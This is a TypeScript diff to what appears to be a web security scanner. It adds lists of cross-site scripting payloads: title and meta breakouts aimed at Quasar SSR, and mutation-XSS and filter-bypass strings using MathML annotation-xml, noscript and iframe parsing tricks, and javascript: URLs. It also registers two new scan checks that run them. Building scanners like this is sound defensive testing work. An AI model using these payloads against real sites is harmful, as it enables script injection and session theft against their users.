@@ -23,7 +23,7 @@ const html = (x: Exchange) =>
   x.response.status < 300 &&
   h(x, "content-type").split(";")[0]?.trim().toLowerCase() === "text/html" &&
   x.response.responseBody.length <= 256000;
-const payloads = [
+export const reflectedPayloads = [
   (m: string) => `"><svg onload="__slurpXss('${m}')">`,
   (m: string) => `'><svg onload="__slurpXss('${m}')">`,
   (m: string) => `</script><svg onload="__slurpXss('${m}')">`,
@@ -31,7 +31,35 @@ const payloads = [
   (m: string) => `";__slurpXss('${m}');//`,
   (m: string) => `<img src=x onerror="__slurpXss('${m}')">`,
 ];
-async function run(ctx: ScanCheckContext, fragment: boolean): Promise<CheckOutput> {
+export const quasarPayloads = [
+  (m: string) => `</title><script>__slurpXss('${m}')</script>`,
+  (m: string) => `</title><img src=x onerror="__slurpXss('${m}')">`,
+  (m: string) => `"><script>__slurpXss('${m}')</script>`,
+  (m: string) => `</title></head><body><img src=x onerror="__slurpXss('${m}')">`,
+];
+export const mxssPayloads = [
+  (m: string) => `<math><annotation-xml encoding="text/html"><style><img src=x onerror="__slurpXss('${m}')"></style></annotation-xml></math>`,
+  (m: string) => `<math><annotation-xml encoding="text/html"><textarea><img src=x onerror="__slurpXss('${m}')"></textarea></annotation-xml></math>`,
+  (m: string) => `<math><annotation-xml encoding="text/html"><noscript><p title="</noscript><img src=x onerror="__slurpXss('${m}')">"></noscript></annotation-xml></math>`,
+  (m: string) => `<math><annotation-xml encoding="text/html"><iframe srcdoc="<script>__slurpXss('${m}')</script>"></iframe></annotation-xml></math>`,
+  (m: string) => `<svg><a href="&Tab;javascript:__slurpXss('${m}')">x</a></svg>`,
+  (m: string) => `<svg><a href="&NewLine;javascript:__slurpXss('${m}')">x</a></svg>`,
+  (m: string) => `</script><img src=x onerror="__slurpXss('${m}')">`,
+  (m: string) => `x</script=+/ + '</script><img src=x onerror="__slurpXss('${m}')">'`,
+  (m: string) => `<noscript><?x </noscript ?><img src=x onerror="__slurpXss('${m}')"></noscript>`,
+  (m: string) => `<iframe><?x </iframe ?><img src=x onerror="__slurpXss('${m}')"></iframe>`,
+  (m: string) => `<noembed><?x </noembed ?><img src=x onerror="__slurpXss('${m}')"></noembed>`,
+  (m: string) => `<noframes><?x </noframes ?><img src=x onerror="__slurpXss('${m}')"></noframes>`,
+  (m: string) => `<img src=1 {{"on"~"error"}}=__slurpXss('${m}')>`,
+  (m: string) => `<s{{"c"~"r"~"i"~"p"~"t"}}>__slurpXss('${m}')</s{{"c"~"r"~"i"~"p"~"t"}}>`,
+  (m: string) => `<i{{"f"~"r"~"a"~"m"~"e"}} {{"on"~"load"}}=__slurpXss('${m}')>`,
+  (m: string) => `<script>alert('${m}')</script>`,
+];
+async function run(
+  ctx: ScanCheckContext,
+  fragment: boolean,
+  candidates = reflectedPayloads,
+): Promise<CheckOutput> {
   if (!ctx.browser)
     return result("Browser validator is unavailable in this execution environment.", true);
   if (!fragment && !ctx.parameter) return result("Select a query or JSON parameter.", true);
@@ -52,7 +80,7 @@ async function run(ctx: ScanCheckContext, fragment: boolean): Promise<CheckOutpu
     browser(x, marker, fragment && value !== undefined ? fragments(value) : undefined);
   const evidence = [...ctx.baselines];
   let cspBlocked = false;
-  for (const payload of payloads) {
+  for (const payload of candidates) {
     const marker = ctx.nonce(),
       value = payload(marker);
     const first = await probe(value, fragment ? "DOM fragment candidate" : "Browser XSS candidate");
@@ -104,6 +132,7 @@ async function run(ctx: ScanCheckContext, fragment: boolean): Promise<CheckOutpu
             secondValue,
             `Browser: ${execution.browser}`,
             `Callback: __slurpXss('${marker}')`,
+            ...(execution.dialogs?.length ? [`JavaScript dialog: ${execution.dialogs[0]}`] : []),
             ...(fragment ? [`Browser URL: ${fragments(value)}`] : []),
             ...[...new Set([...execution.sinks, ...repeated.sinks])]
               .slice(0, 12)
@@ -143,6 +172,20 @@ export const browserChecks: ScanCheck[] = [
     active: true,
     perParameter: false,
     run: runDomXss,
+  },
+  {
+    id: "quasar-meta-xss",
+    name: "Quasar SSR meta/title XSS (getHead)",
+    active: true,
+    perParameter: true,
+    run: (ctx) => run(ctx, false, quasarPayloads),
+  },
+  {
+    id: "mxss",
+    name: "mXSS via MathML annotation-xml (ammonia)",
+    active: true,
+    perParameter: true,
+    run: (ctx) => run(ctx, false, mxssPayloads),
   },
   {
     id: "dom-interaction",
